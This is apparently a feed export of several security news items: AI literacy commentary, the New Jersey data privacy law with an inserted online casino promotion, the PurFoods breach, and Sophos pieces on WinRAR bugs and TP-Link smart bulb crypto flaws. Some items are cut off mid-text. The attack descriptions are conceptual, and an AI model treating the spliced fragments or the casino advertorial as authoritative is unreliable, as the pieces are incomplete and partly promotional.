new threat landscape, CISOs and Cybersecurity teams can implement Agentic AI to take advantage of its immense power while mitigating any potential risks it may introduce.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/the-unique-challenges-of-securing-agentic-ai/\">The Unique Challenges of Securing Agentic AI</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/the-unique-challenges-of-securing-agentic-ai/\">The Unique Challenges of Securing Agentic AI</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

And that&#8217;s what AI literacy is all about –– knowing how to think critically about AI, use it well and make wise choices.</p>\n<p><strong>What AI Literacy Day Is About</strong></p>\n<p>On March 28, people across the country celebrated AI Literacy Day. The goal of the day is to help people learn about AI in a simple and clear way. Students, teachers and communities came together to explore what AI really is and why it matters. It wasn&#8217;t just about facts; it was about getting people talking, asking questions, and thinking about how AI fits into their lives. The day also gave professionals and educators a chance to grow their knowledge through webinars and workshops. These events helped people stay in the loop as AI tools and ideas evolve.</p>\n<p><strong>Giving People Power Through Knowledge </strong></p>\n<p>When people understand AI, they can make better decisions about how and when to use it. It&#8217;s not enough to know that AI exists; it&#8217;s about learning how to use it the right way.</p>\n<p>Rick Caccia, Founder and CEO of <a href=\"https://witness.ai/\">WitnessAI</a>, said, &#8220;To be aware of the growing value of AI is one thing, but the true power lies in knowing how to use the technology properly and responsibly as it continues to grow in relevance. AI Literacy Day is a chance to think about the incredible power of AI and how it&#8217;s changing our world.&#8221;</p>\n<p><strong>Making Ethical Choices</strong></p>\n<p>AI literacy also helps people think through tough issues like privacy, fairness and the bigger effects AI can have on society.

As companies add AI into their workflows, workers who understand the technology have an edge.</p>\n<p>Anthony Cammarano, Vice President, Engineering, &amp; Chief Technology Officer at <a href=\"https://www.protegrity.com/\">Protegrity</a>, said, &#8220;Being literate in AI means being literate in best practices for <a href=\"https://www.cybersecurity-insiders.com/6-reasons-why-cybersecurity-matters-more-now-than-it-ever-did-in-the-past/\">data security</a> throughout its lifecycle. To continue exploring uses for AI, it is key to make stolen data useless to threat actors.&#8221;</p>\n<p><strong>The Bigger Picture in Tech</strong></p>\n<p>AI literacy is critical in the world of technology. It&#8217;s not just about building new tools, it&#8217;s about people who understand AI creating new ideas, solving problems and moving it forward thoughtfully and intelligently. However, they also play a significant role in ensuring AI is used fairly and safely. Setting rules, thinking about bias and ensuring people are protected is key to this.

        "content": "<p>New Jersey passed a new cybersecurity regulation in January 2025. This makes the state the latest to implement strong rules regarding people’s data and how it is protected. The new law is going to affect every company that handles personal information, with organizations having until the 15th of July to adapt to the latest regulations. </p>\n<p><strong>Some Sectors are Already Ahead of the Curve</strong></p>\n<p>In New Jersey, some sectors are already ahead of the curve when it comes to the protection of personal data. Banking establishments in the state commonly use 2FA along with encryption to ensure that <a href=\"https://www.ncsc.gov.uk/collection/top-tips-for-staying-secure-online\">user data is kept safe</a>. Telecommunication companies often have to regulate the collection, use and disclosure of customer data as well, ensuring that they abide by the strict regulations that have been in place for some time. In other verticals, like iGaming, state-of-the-art methods are also already present. When you sign up with a <a href=\"https://playstar.com/\">real money online casino NJ</a>, multifactor authentication and encryption help to ensure that user data is protected.</p>\n<p>With casinos offering deals like 100% deposit matches up to $500, having this kind of protection is imperative. Welcome bonuses are very popular with new users, so sites need to be able to safeguard new information as sign-ups spike during promotional periods. Sites that handle this kind of data also have measures in place to stop unauthorized access to customer accounts, which helps to set the standard for online security.</p>\n<p>With the upcoming NJDPA underway, businesses that operate in verticals like this are already well-positioned to meet the new requirements, as they have been following high standards for quite some time.</p>\n<p><strong>What Will the Data Protection Act Affect?</strong></p>\n<p>The NJDPA applies to businesses who either do business in New Jersey, or who target New Jersey when selling products or services. In other words, even international companies may find themselves subjected to the new rules. One thing to take note of is that it only applies to companies that handle personal data for <a href=\"https://termly.io/resources/articles/new-jersey-data-privacy-act/\">100,000 people or more</a>. If you have a business that generates revenue from selling or sharing data, however, then the limit drops to 25,000.</p>\n<p>One change in the law when compared to other states is that it doesn’t impose any limitations as to how much money companies can make when selling data. For some sectors, such as telecommunication, this is beneficial. With that said, companies who opt to sell data need to make sure that they are giving consumers the chance to opt out. To enhance protection for both businesses and residents, companies also need to limit the data that they collect to necessary things.</p>\n<p>Security measures like this are helping to ensure that the bar is raised when it comes to online security, and it also encourages businesses to make sure that they are using encryption methods, in combination with other authentication strategies to keep their users safe. Many sectors do this already, but it seems that as time goes on, it is becoming the standard for security across the US.</p>\n<p> </p>\n<p> </p>\n<p> </p><p>The post <a href=\"https://www.cybersecurity-insiders.com/what-is-the-new-jersey-data-protection-act-and-how-does-it-affect-businesses/\">What is the New Jersey Data Protection Act and How does it Affect Businesses?</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/what-is-the-new-jersey-data-protection-act-and-how-does-it-affect-businesses/\">What is the New Jersey Data Protection Act and How does it Affect Businesses?</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

        "content": "US food delivery compeny PurFoods, which trades as\nMom’s Meals\n, has just admitted to a\ncyberintrusion\nthat took place from 2023-01-16 to 2023-02-22.\nThe company stated officially that:\n[The] cyberattack […] included the encryption of certain files in our network.\nBecause the investigation identified the presence of tools that could be used for data exfiltration (the unauthorized transfer of data), we can’t rule out the possibility that data was taken from one of our file servers.\nPurFoods says it has contacted everyone whose was affected, or at least everyone whose data appeared in one or more of the scrambled files, which we assume are the files that the company thinks the attackers would have stolen, if indeed any data was exfiltrated.\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nWhat’s at risk\nThe company didn’t say how many people were caught up in this incident, but a\nrecent report\non IT news site\nThe Register\nputs the total at more than 1,200,000 individuals.\nPurFoods listed those affected as:\nClients of PurFoods who received one or more meal deliveries, as well as some current and former employees and independent contractors.\nThe information in the files included date of birth, driver’s license/state identification number, financial account information, payment card information, medical record number, Medicare and/or Medicaid identification, health information, treatment information, diagnosis code, meal category and/or cost, health insurance information, and patient ID number.\nSocial Security numbers [SSNs] were involved for less than 1% of the [individuals], most of which are internal to PurFoods.\nWe’re guessing that the company didn’t collect SSNs for customers, though we’d expect them to need SSN data for employees, which is why the at-risk SSNs are listed as “internal”.\nBut if you’re wondering why a food delivery company would need to collect customers’ medical details, including health and treatment information…\n…well, we wondered that, too.\nIt seems that the company specialises in providing meals for people with specific dietary needs, such as those with diabetes, kidney problems and other medical conditions, for whom food ingredients need to be chosen carefully.\nMom’s Meals therefore needs medical details for some, if not all, of its customers, and that data was mixed in with plenty of other personally identifiable information (PII) that may now be in the hands of cybercriminals.\nWhat to do?\nIf you’re one of the more than a million affected customers:\nConsider replacing your payment card if yours was listed as possibly stolen.\nMost banks will issue new payment cards promptly, thus automatically invalidating your old card and making the old card details useless to anyone who has them now or buys them up later on the dark web.\nWatch your statements carefully.\nYou should do this anyway, so that you spot anomalies as soon as you can, but it’s worth keeping a closer eye on what’s happening with your financial accounts if there’s evidence you might be at a greater-than-usual risk of identity theft or card abuse.\nConsider implementing a credit freeze.\nThis adds an extra layer of authorisation from you that’s needed before anything in your credit report can be released to anyone. This makes it harder for crooks to acquire loans, credit cards and the like in your name (although this obviously makes it harder – and thus takes longer – for you to get a new loan, credit card or mortgage, too). Unfortunately,\nactivating a credit freeze\nmeans you need to send a large amount of PII, including a copy of your photo ID and your SSN, to one of three main credit bureaus.\nIf you’re a company that handles vital PII of this sort:\nAct immediately when any anomalies are detected in your network.\nIn this attack, the criminals were apparently inside the PurFoods network for more than a month, but were only spotted after they’d got as far as scrambling files, presumably as a basis for extorting money from the company.\nConsider using a Managed Detection and Response (MDR) service if you can’t keep up on your own.\nGood threat hunting tools not only search for and prevent the activation of malware, but also help you to detect weak spots in your network such as unprotected or unpatched computers, and to identify and isolate behaviour that’s commonly seen in the build-up to a full-blown attack. Having threat hunting experts on hand all the time makes it much more likely that you’ll spot any danger signals before it’s too late.\nBe as quick and as transparent as you can in any data breach notifications.\nDespite the suggestion that this was a two-pronged steal-data-and-then-scramble-it attack, known in the jargon as\ndouble extortion\n, PurFoods hasn’t made it clear what really happened, even though the company tooks several months to investigate and publish its report. For example, we still don’t know whether the company received any blackmail demands, whether there was any “negotiation” with the attackers, or whether any money changed hands in return for hushing up the incident or for buying back decryption keys to recover the scrambled files.\nAccording to the data in the latest\nSophos Active Adversary report\n, the median average\ndwell time\nin ransomware attacks (the time it takes between the crooks first breaking into your network and getting themselves into a position to compromise all your files in one simultaneous strike) is now down to just five days.\nThat means that if your company does get “chosen” by ransomware criminals for their next money-grabbing attack, there’s a\nbetter than 50% chance\nthat you’ll have\nless than a week\nto spot the crooks sneaking around getting ready for your network doomsday event.\nWorse still, the final hammer blow unleashed by ransomware attackers is likely to be at a deeply inconvenient time for your own IT team, with the file-scrambling denouement typically unleashed between 21:00 and 06:00 (9pm to 6am) in your local timezone.\nTo counter-paraphrase Mr Miagi of Karate Kid fame:\nBest way to avoid punch is to be there all the time\n, monitoring and reacting as soon as you can.\nShort of time or expertise to take care of cybersecurity threat response? Worried that cybersecurity will end up distracting you from all the other things you need to do?\nLearn more about\nSophos Managed Detection and Response\n:\n24/7 threat hunting, detection, and response\n▶\nShare this:\nMastodon\nBluesky\nReddit\nLinkedIn\nMore\nTumblr\nPocket\nPrint\nEmail",

[MORE LAUGHTER]\nDOUG.\nAnd she noted:\nIf any of your friends ever sees that your letter to another contains identical ingredients, you will have no further correspondence problems.\nAs in, you’re done corresponding with this friend because the friendship is over.\nDUCK.\nYes, the question will answer itself. [LAUGHTER]\nDOUG.\nExactly.\nAlright, let’s get into it.\nHere we have a pair of WinRAR bugs… remember WinRAR?\nOne is, “A security issue involving an out-of-bounds write.”\nAnd number two, “WinRAR could start a wrong file after a user double-clicked an item in a specially crafted archive.”\nPaul, what’s going on here with WinRAR?\nhttps://nakedsecurity.sophos.com/2023/08/23/using-winrar-be-sure-to-patch-against-these-code-execution-bugs/\nDUCK.\nWell, WinRAR… lots of people will remember that from the old days, when archives typically came on multiple floppies, or they came as lots and lots of separate small text-encoded posts in an internet forum.\nWinRAR, if you like, set the standard for making it easy to collate lots of separate sources, putting them back together for you and having what I believe it refers to as a “recovery volume”.\nThat was one or more additional parts so that if one or more of the original parts is damaged, corrupted or even (as you imagine in the case of floppy disks or uploaded chunks in an online forum) missing completely, the program could automatically reconstruct the missing part based on error correction data in this recovery volume.\nAnd, unfortunately, in (I believe) the older code in the product that dealt with the old-style error recovery system…\n…as far as I can understand it (obviously they’re not giving away the exact details of this), you send someone an archive that has a corrupt part which forces WinRAR to go and use its recovery volume to try and deal with the bit that’s been damaged.\nAnd in handling the recovery data, there’s a buffer overflow which writes beyond the end of the buffer, which could cause remote code execution.\nThis is CVE-2023-40477, where trying to recover from a fault causes a fault that can be exploited for remote code execution.\nSo if you are a WinRAR user, make sure that you have patched.\nBecause there was a coordinated disclosure of this by the Zero Day Initiative and by WinRAR recently; everyone knows that this bug is out there by now.\nDOUG.\nThe second bug is less serious, but still a bug nonetheless…\nDUCK.\nApparently this one was used by crooks for tricking people into installing data-stealing malware or cryptocurrency roguery, who would have thought?\nGiven that I’m not a WinRAR user, I couldn’t test this, but my understanding is that you can open an archive and when you go to access something in the archive, *you get the wrong file* by mistake.\nDOUG.\nOK, so version 6.23 if you’re still using WinRAR.\nOur next story is from the “how in the world did they find this bug?” file.\nResearchers have discovered how to trick you into thinking your iPhone is in Airplane mode while actually leaving mobile data turned on.\nhttps://nakedsecurity.sophos.com/2023/08/21/snakes-in-airplane-mode-what-if-your-phone-says-its-offline-but-isnt/\nDUCK.\nI was minded to write this up because it is a fascinating reminder that when you are relying on visual indicators provided by the operating system or by an app, say in a status bar or, on the iPhone, in the so called Control Center, which is the buttons you get when you swipe up from the bottom of the screen…\nThere’s a little icon of an aircraft, and if you tap it, you go into Aeroplane mode.\nAnd so researchers at Jamf figured, given that that’s the workflow that most people do if they temporarily want to make sure their phone is offline, “How strongly can you rely on indicators like that Control Center that you swipe up on your iPhone?”\nAnd they discovered that you can actually trick most of the people most of the time!\nThey found a way that, when you tap on the aircraft icon, it’s supposed to go orange and all the other icons that show radio connection are supposed to dim out… well, they found that they could get that aircraft to become orange, but they could suppress the mobile data bit being turned off.\nSo it looks like you’re in Aeroplane mode, but in fact your mobile data connection is still valid in the background.\nAnd then they reasoned that if someone really was serious about security, they’d figure, “Well, I want to make sure that I am disconnected.”\nAnd I would have followed exactly the workflow that they suggest in their research article, namely: I would open my browser, and I’d browse to a site (nakedsecurity.sophos.com, for example), and I would check that the system gave me an error saying, “You’re in Aeroplane mode. You can’t get online.”\nI would have been inclined, at that point, to believe that I really had disconnected my phone from the network.\nBut the researchers found a way of tricking individual apps into convincing you that you were in Aeroplane mode when in fact all they’d done is deny mobile data access to that specific app.\nNormally, when you go into Safari and you’ve said that Safari is not allowed to use my mobile data, what you’re supposed to get is an error message along the lines of, “Mobile data is turned off for Safari.”\nIf you saw that message when you were testing connectivity, you would realise, “Hey, that means mobile data is still on in general; it’s only off for this specific app. That’s not what I want: I want it off for everybody.”\nSo they found a way of faking that message.\nIt displays the one that says, “You’re in Aeroplane mode. You can’t get online.”\nIt is a great reminder that sometimes you can’t believe what you see on the screen.\nIt helps to have two ways of checking that your computer is in the security status, or at the security level, that you want it to be in.\nJust in case someone is pulling the wool over your eyes.\nDOUG.\nAlright, it gives me great pleasure to announce that we will keep an eye on that.\nAnd last, but certainly not least, anyone who set up a smart device knows the process by now.\nThe device transmits itself as an access point.\nYou connect to that access point with your phone, tell it what *your* access point is, complete with Wi-Fi password.\nAnd what could possibly go wrong?\nWell, several things, it turns out, Paul, could go wrong!\nhttps://nakedsecurity.sophos.com/2023/08/22/smart-light-bulbs-could-give-away-your-password-secrets/\nDUCK.\nYes.\nIn this particular paper, the researchers focused on a product called the TP-Link Tapo L530E.\nNow, I don’t want to point fingers particularly at TP-Link here… in the paper, they said they chose that one because, as far as they could see (and the researchers are all, I think, Italian), that was the most widely sold so-called smart light bulb via Amazon in Italy.\nDOUG.\nWell, that’s what’s interesting, too… we talk about these IoT devices and all the security problems they have, because not a lot of thought goes into securing them.\nBut a company like TP-Link is big and reasonably well regarded.\nAnd you would assume that, of the IoT device companies, this would be one that would be putting a little extra wood behind security.\nDUCK.\nYes, there were definitely some coding blunders that should not have been made in these vulnerabilities, and we’ll get to that.\nAnd there are some authentication-related issues that are somewhat tricky to solve for a small and simple device like a light bulb.\nThe good news is that, as the researchers wrote in their paper, “We contacted TP-Link via their vulnerability research program, and they’re now working on some sort of patch.”\nNow, I don’t know why they chose to disclose it and publish the paper right now.\nThey didn’t say whether they’d agreed on a disclosure date, and they didn’t say when they told TP-Link and how long they’ve given them so far, which I thought was a bit of a pity.\nIf they were going to disclose because they thought TP-Link had taken too long, they could have said that.\nIf it hasn’t been very long, they could have waited a little while.\nBut they didn’t give any copy-and-paste code that you can use to exploit these vulnerabilities, so there are nevertheless some good lessons to learn from it.\nThe main one seems to be that when you’re setting up the light bulb for the first time, there is some effort put into making sure that the app and the light bulb each reason that they are communicating with the right sort of code at the other end.\nBut even though there’s some effort to do that, it relies on what we might jokingly call a “keyed cryptographic hash”… but the key is hard-wired and, as the researchers found, they didn’t even need to go and disassemble the code to find the key, because it was only 32 bits long.\nSo they were able to recover it by brute force in 140 minutes.\nDOUG.\nTo be clear, an attacker would need to be within range of you, and set up a rogue access point that looks like your light bulb, and have you connect to it.\nAnd then they’d be able to get you to type in your Wi-Fi password, and your password to your TP-Link account, and they’d get that stuff.\nBut they would need to be physically within range of you.\nDUCK.\nThe attack can’t be mounted remotely.\nIt’s not like somebody could just send you some dubious link from the other side of the world and get all that data.\nBut there were some other bugs as well, Doug.\nDOUG.\nYes, several things went wrong, as mentioned.\nIt seems that this lack of authentication carried through to the setup process as well.\nDUCK.\nYes.\nObviously what’s really important when the setup actually starts is that the traffic between the app and the device gets encrypted.\nThe way it works in this case is that the app sends an RSA public key to the light bulb, and the light bulb uses that to encrypt and send back a one-time 128-bit AES key for the session.\nThe problem is that, once again, just like with that initial exchange, the light bulb makes no effort to communicate to the app, “Yes, I really am a light bulb.”\nBy creating that fake access point in the first place, and knowing the magic key for the “are you there?/yes, I am here” exchange… by exploiting that hole, an imposter could lure you to the wrong access point.\nAnd then there’s no further authentication.\nAn imposter light bulb can come back and say, “Here’s the super-secret key that only you know and I know.”\nSo you are communicating securely…\n…with the imposter!\nDOUG.\nSurely, by now, we’re done with the problems, right?\nDUCK.\nWell, there were two further vulnerabilities they found, and in a way, the third of these is the one that worried me the most.\nOnce you’d established this session key for the secure communication, you’d assume that you would get the encryption process right.\nAnd my understanding is that the coders at TP-Link made a fundamental cryptographic implementation blunder.\nThey used AES in what’s called CBC, or “cipher block chaining” mode.\nThat’s a mode that is meant to ensure that if you send a packet with exactly the same data two, three, four or more times, you can’t recognise that it’s the same data.\nWith repeated data, even if an attacker doesn’t know what the data is, they can see that the same thing is happening over and over.\nWhen you’re using AES in CBC mode, the way you do that is you prime the encryption process with what’s called an IV or an “initialization vector” before you start encrypting each packet.\nNow, the key has to be a secret.\nBut the initialization vector doesn’t: you actually put it in the data at the start.\nThe important thing is it needs to be different every time.\nOtherwise, if you repeat the IV, then when you encrypt the same data with the same key, you get the same ciphertext every time.\nThat produces patterns in your encrypted data.\nAnd encrypted data should never display any patterns; it should be indistinguishable from a random stream of stuff.\nIt seems that what these programmers did was to generate the key and the initialisation vector right at the start, and then whenever they had data to send, they would reuse the same key and the same initialisation vector.\n[VERY SERIOUS] Don’t do that!\nAnd a good aid memoire is to remember another word in cryptographic jargon: “nonce”, which is short for “number used once.”\nAnd the hint is right there in the name, Doug\nDOUG.\nOK, have we covered everything now, or is there still one more problem?\nDUCK.\nThe last problem that the researchers found, which is a problem whether or not initialisation vectors are used correctly (although it’s a more acute problem if they are not), is that none of the requests and replies being sent back and forth were timestamped reliably, which meant that it was possible to re-send an old data packet without knowing what it was all about.\nRemember, it’s encrypted; you can’t read inside it; you can’t construct one of your own… but you could take an old packet, say from yesterday, and replay it today, and you can see (even when an attacker doesn’t know what that data packet is likely to do) why that is likely to create havoc.\nDOUG.\nAll right, so it sounds like the TP-Link engineering team has a fun challenge on their hands the next couple of weeks or months.\nAnd speaking of fun, Richard chimes in on this story and asks a new version of an old question:\nHow many cryptographers does it take to update a light bulb?\nThat

        "content": "The venerable RAR program, short for\nRoshal’s Archiver\nafter its original creator, has been popular in file sharing and software distribution circles for decades, not least because of its built-in error recovery and file reconstruction features.\nEarly internet users will remember, with little fondness, the days when large file transfers were shipped either as compressed archives split across multiple floppy disks, or uploaded to size-conscious online forums as a series of modestly-sized chunks that were first compressed to save space and then expanded into an ASCII-only text-encoded form.\nIf one floppy went missing or wouldn’t read back properly, or if one chunk of a 12-part archive upload got deleted from the server by mistake, you were out of luck.\nRAR, or WinRAR in its contemporary Windows form, helped to deal with this problem by offering so-called\nrecovery volumes\n.\nThese stored error correction data such that multi-part archives could be recovered automatically and completely even if one entire chunk (or more, depending on how much recovery information was kept) ended up lost or irretrievable.\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nKeeping a spare wheel in the boot/trunk\nApparently, RAR archives up to and including version 4 used so-called\nparity correction\n; newer versions use a computationally more complex but more powerful error correction system known as\nReed-Solomon codes\n.\nParity-based correction relies on the XOR operation, which we’ll denote here with the symbol ⊕ (a plus sign inside a circle).\nXOR is short for\nexclusive OR\n, which denotes “either X is true or Y is true, but not both at the same time”, thus following this\ntruth table\n, which we construct by assuming that X and Y can only have the values 0 (false) or 1 (true):\nIf X=0 and Y=0 then X ⊕ Y = 0 (two falses make a false)\nIf X=1 and Y=0 then X ⊕ Y = 1 (one can be true, but not both)\nIf X=0 and Y=1 then X ⊕ Y = 1 (one can be true, but not both)\nIf X=1 and Y=1 then X ⊕ Y = 0 (it's got to be one or other)\nThe XOR function works a bit like the question, “Would you like coffee or tea?”\nIf you say “yes”, you then have to choose coffee alone, or choose tea alone, because you can’t have one cup of each.\nAs you can work out from the truth table above, XOR has the convenient characteristics that\nX ⊕ 0 = X\n, and\nX ⊕ X = 0\n.\nNow imagine that you have three data chunks labelled A, B, and C, and you compute a fourth chunk P by XORing A and B and C together, so that\nP = (A ⊕ B ⊕ C)\n.\nGiven the truth table above, and given that XOR is what’s known as\ncommutative\n, meaning that the order of the values in a calculation can be swapped around if you like, so that\nX ⊕ Y = Y ⊕ Z\n, or\nA ⊕ B ⊕ C = C ⊕ B ⊕ A = B ⊕ C ⊕ A\nand so on, we can see that:\nA ⊕ B ⊕ C ⊕ P = A ⊕ B ⊕ C ⊕ (A ⊕ B ⊕ C)\n              = (A⊕A) ⊕ (B⊕B) ⊕ (C⊕C)\n              = 0 ⊕ 0 ⊕ 0\n              = 0\nNow look what happens if any one of A, B or C is lost:\nA ⊕ B     ⊕ P = A ⊕ B ⊕ (A ⊕ B ⊕ C)\n              = (A⊕A) ⊕ (B⊕B) ⊕ C\n              = 0 ⊕ 0 ⊕ C\n              = C   <--the missing chunk returns!\n\nA ⊕     C ⊕ P = A ⊕ C ⊕ (A ⊕ B ⊕ C)\n              = (A⊕A) ⊕ (C⊕C) ⊕ B \n              = 0 ⊕ 0 ⊕ B\n              = B  <--the missing chunk returns!\n\n    B ⊕ C ⊕ P = B ⊕ C ⊕ (A ⊕ B ⊕ C)\n              = (B⊕B) ⊕ (C⊕C) ⊕ A \n              = 0 ⊕ 0 ⊕ A\n              = A  <--the missing chunk returns!\nAlso, if P is lost, we can ignore it because we can compute\nA ⊕ B ⊕ C\nanyway.\nSimply put, having the parity data chunk P means we can always reconstruct any missing chunk, regardless of which one it is.\nThe error recovery error\nWell, after what we assume is many years unnoticed, a bug now dubbed\nCVE-2023-40477\nhas surfaced\nin WinRAR.\nThis bug can be triggered (ironically, perhaps) when the product makes use of this data recovery system.\nAs far as we can see, a booby-trapped parity data chunk inserted into an archive can trick the WinRAR code into writing data outside of the memory area allocated to it.\nThis leads to an exploitable\nbuffer overflow\nvulnerability.\nData written where it doesn’t belong ends up being treated as program code that gets executed, rather than as plain old data to be used in the dearchiving process.\nThis bug didn’t get a 10/10 severity score on the CVSS “danger scale”, clocking in at 7.8/10 on the grounds that the vulnerability can’t be exploited without some sort of assistance from the user who’s being targeted.\nBug the second\nInterestingly, a second security bug was patched in the latest WinRAR release, and although this one sounds less troublesome than the CVE-2023-40477 flaw mentioned above,\nTechCrunch suggests\nthat it has been exploited in real life via booby-trapped archives\n“posted on at least eight public forums [covering] a wide range of trading, investment, and cryptocurrency-related subjects.”\nWe can’t find a CVE number for this one, but WinRAR describes it simply as:\nWinRAR could start a wrong file after a user double-\n  clicked an item in a specially crafted archive.\nIn other words, a user who opened up an archive and decided to look at an apparently innocent file inside it (a README text file, for example, or a harmless-looking image) might unexpectedly launch some other file from the archive instead, such as an executable script or program.\nThat’s a bit like receiving an email containing a safe-looking attachment along with a risky-looking one, deciding to start by investigating only the safe-looking one, but unknowingly firing up the risky file instead.\nFrom what we can tell, and in another irony, this bug existed in WinRAR’s code for unpacking ZIP files, not in the code for processing its very own RAR file format.\nTwo-faced ZIP files have been a cybersecurity problem for years, because the index of files and directories in any ZIP archive appears twice, once in a series of data blocks interleaved throughout the file, and then again in a single chunk of data at the end. Code that verifies files based on one index but extracts and uses them based on the other, without checking that the two indices are consistent, has led to numerous exploitable vulnerabilites over the years. We don’t know whether this double-index issue is the root cause of the recent WinRAR bug, but it’s a reminder that unpacking archive files can be a complex and error-prone process which needs careful attention to security, even at the cost of extra processing and reduced performance.\nhttps://nakedsecurity.sophos.com/2013/11/06/anatomy-of-a-file-format-problem-yet-another-code-verification-bypass-in-android/\nWhat to do?\nIf you’re a WinRAR user,\nmake sure you’re on the\nlatest version\n, which is 6.23 at the time of writing [2023-08-23T16:30Z]\nApparently, there’s no automatic update system in the WinRAR software, so you need to download the new installer and run it yourself to replace an old version.\nIf you’re a programmer,\nremember to review legacy code that’s still in your software but looked upon as “retired” or “no longer recommended for new users”.\nAs far as we can see, WinRAR doesn’t generate old-style recovery data any more, and has used smarter error correction algotithms since version 5, but for reasons of backwards compatibility still processes old-style files if they’re presented.\nRemember that when attackers create booby-trapped files hoping to trip up your software, they’re generally not using your software to create those files anyway, so testing your own input routines only against files that your own output routines originally created is never enough.\nIf you haven’t considered\nfuzzing\n, a jargon term that refers to a testing technique in which millions of permuted, malformed and deliberately incorrect inputs are presented to your software while monitoring it for misbehaviour…\n…then now might be the time to think about it.\nGood fuzzers not only run your code over and over again, but also try to\nadapt the tweaks\n, hacks and modifications they make to their fake input data so that as much of your code as possible gets tried out.\nThis helps you get what’s known as good\ncode coverage\nduring testing, including forcing your program down rare and unsual code paths that hardly ever get triggered in regular use, and where unexplored vulnerabilities may have lurked unnoticed for years.\nShare this:\nMastodon\nBluesky\nReddit\nLinkedIn\nMore\nTumblr\nPocket\nPrint\nEmail",

        "content": "A trio of researchers split between Italy and the UK have recently\npublished a paper\nabout cryptographic insecurities they found in a widely-known smart light bulb.\nThe researchers seem to have chosen their target device, the TP-Link Tapo L530E, on the basis that it is\n“currently [the] best seller on Amazon Italy,”\nso we don’t know how other smart bulbs stack up, but their report has plenty to teach us anyway.\nThe researchers say that:\nWe dutifully contacted TP-Link via their Vulnerability Research Program (VRP), reporting all four vulnerabilities we found.\nThey acknowledged all of them and informed us that they started working on fixes both at the app and at the bulb firmware levels, planning to release them in due course.\nFor better or for worse (the authors of the paper don’t say whether any disclosure dates were agreed with TP-Link, so we don’t know how long the company has been working on its patches), the researchers have now revealed how their attacks work, albeit without providing any copy-and-pastable attack code for wannabe home-hackers to exploit at will.\nWe therefore thought that the paper was worth looking into.\n24/7 threat hunting, detection, and response delivered by an expert team as a fully-managed service.\nLearn More\nWireless setup\nLike many so-called “smart” devices, the Tapo L530E is designed so it can be set up quickly and easily over Wi-Fi.\nAlthough wireless-based configuration is common even for battery-powered devices that can be charged and set up via built-in USB ports, such as cameras and bike accessories, light bulbs generally don’t have USB ports, not least for space and safety reasons, given that they’re designed to be plugged into and left in a mains light socket.\nBy turning a Tapo L530E light bulb on and off repeatedly at the wall switch for one second at a time, you can force it into setup mode (apparently, the bulb automatically blinks three times to tell you when it’s ready for configuration).\nLike most automatically configurable devices, this causes the smart bulb to turn itself into a Wi-Fi access point with an easy-to-recognise network name of the form\nTapo Bulb XXXX\n, where the X’s form a string of digits.\nYou then connect to that temporary access point, which isn’t password protected, from an app on your smartphone.\nThen you tell the bulb how to connect both to your password-protected home Wi-Fi network and to your TP-Link cloud account in future, after which the bulb’s firmware can reboot and connect itself up to the internet, allowing you to manage it from the app on your phone.\nThe bulb can join home network, which means means you can contact it directly via your own Wi-Fi when you’re at home, even if your ISP is offline at the time.\nAnd the bulb can connect over the internet to your cloud account, so you can also send commands to it indirectly via your cloud account while you’re on the road, for example to turn lights on and off if you’re late getting back in order to give the impression that there’s someone at home.\nBeware imposters\nYou can probably guess where this is going.\nIf the app on your phone doesn’t have any cryptographically strong way of figuring out that it really has connected to a genuine light bulb when you go through the setup process…\n…then a nearby attacker who just happens to start up a fake\nTapo Bulb XXXX\naccess point at the right moment could lure you into sending those important setup secrets to their “imposter bulb” device instead of to the real thing, thus capturing both your Wi-Fi password and your TP-Link account details.\nThe good news is that the researchers noticed that both the Tapo app and the L530E firmware included a basic safety check to help the app and your bulbs to find each other retliably, thus reducing the risk that the app would blurt out your passwords when it shouldn’t.\nBut the bad news is that protocol used for this\nare you really a light bulb?\nexchange was clearly designed to avoid mistakes rather than to prevent attacks.\nLoosely put, the app locates any light bulbs on its network by broadcasting special UDP packets to port 20002 and seeing which devices reply, if any.\nTo help any listening light bulbs decide that an\nare you there?\nrequest came from the Tapo app, rather than from some other unknown product or service that just happens to use port 20002 as well, the request includes what’s known in the jargon as a\nkeyed hash\n.\nThe\nI am here!\nreply from the light bulb includes the same sort of keyed checksum to help the app filter out unexpected and unwanted UDP replies.\nSimply put, the keyed hash is a checksum based not only on the data in the UDP packet but also some additional key bytes that are folded into the checksum as well.\nUnfortunately, the Tapo protocol uses fixed key bytes for its checksum, with the same “key” hard-wired into the app and into the firmware of every Tapo bulb.\nIn other words, once someone has decompiled either the app, or the light bulb firmware, or both, and recovered this “key”, you should assume that anybody and everybody will know what it is, making those a\nre you there?/I am here!\nmessages trivial to forge.\nWorse, the researchers found that they didn’t need to decompile anything, because this not-so-secret “key” is only 32 bits long, which means that by setting your own Tapo bulb into setup mode and then feeding it\nare you there?\nmessages using all 2\n32\npossible checksum keys, you’ll eventually hit on the right key by what’s known as\nbrute force\n.\nThat’s the cryptographic equivalent of spinning the dials to try every combination on a bike lock, say from\n000\nto\n999\n, until you get lucky and the lock pops open. (On average, you’ll open the lock after trying half the possible combinations, but it will never take you more than 1000 goes.)\nIn fact, they didn’t need to send 2\n32\nmessages from the app to a light bulb to crack the key.\nBy capturing just one known-genuine message with a valid keyed hash in it, they could then test all possible keys offline until they produced a message that had the same keyed hash as the one they’d saved.\nThat means the brute force attack could proceed at CPU speed, not merely at Wi-Fi network packet speed, and the researchers state that\n“in our setup, the brute force attack always succeeded in 140 minutes on average.”\n(We’re assuming they tried it repeatedly just to test that their cracking code was working correctly, although with a hard-wired key shared by all Tapo bulbs, just their first crack would have been enough.)\nAs long as you’ll speak securely, I don’t care you who are\nThe next cryptographic problem turned up in the next stage of the light bulb setup process, and was a similar sort of mistake.\nAfter accepting a light bulb as genuine based on a keyed-hash-that-doesn’t-actually-have-a-key, the app agrees on a session key to encrypt its traffic with the “genuine” bulb…\n…but once again has no way of checking whether the key agreement took place with a real bulb or an imposter.\nAgreeing on a 